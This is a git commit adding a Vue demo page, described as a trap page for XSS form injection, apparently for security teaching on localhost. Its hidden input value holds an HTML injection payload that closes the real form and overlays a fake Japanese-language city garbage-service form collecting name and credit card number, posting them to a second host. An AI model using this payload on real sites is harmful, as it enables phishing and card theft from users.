7a157ad3686a14bc7e4c0de635ea9da6a859155e
watanata <watanabetatsuya@lifull.com>
2019-09-05 16:53:27 +0900

    add trap-page for XSS form injection

---
+++ pages/input_xss.vue
@@ -0,0 +1,13 @@
+<template>
+  <div>
+    <p>〇〇市の粗大ごみ受付がクレジットカードでできるようになっていた。これは便利です
+    <form action="http://localhost:3000/input" method="POST">
+      <input name="name" type="hidden" value='
+      ></form><form style=top:5px; left=5px;position:absolute;z-index:99;background-color:white action=http://localhost:3333/hoge method=POST>粗大ごみの受付がクレジットカード対応しました。</br>氏名 <input size=20 name=name></br>カード番号 <input size=20 name=card></form>'>
+
+      <input style="cursor:pointer;text-decoration:underline;color:blue;border:node;background:transparent;font-size:100%;" type="submit" value="〇〇市粗大ごみ申し込みセンター">
+    </form>
+  </div>
+
+</template>
+
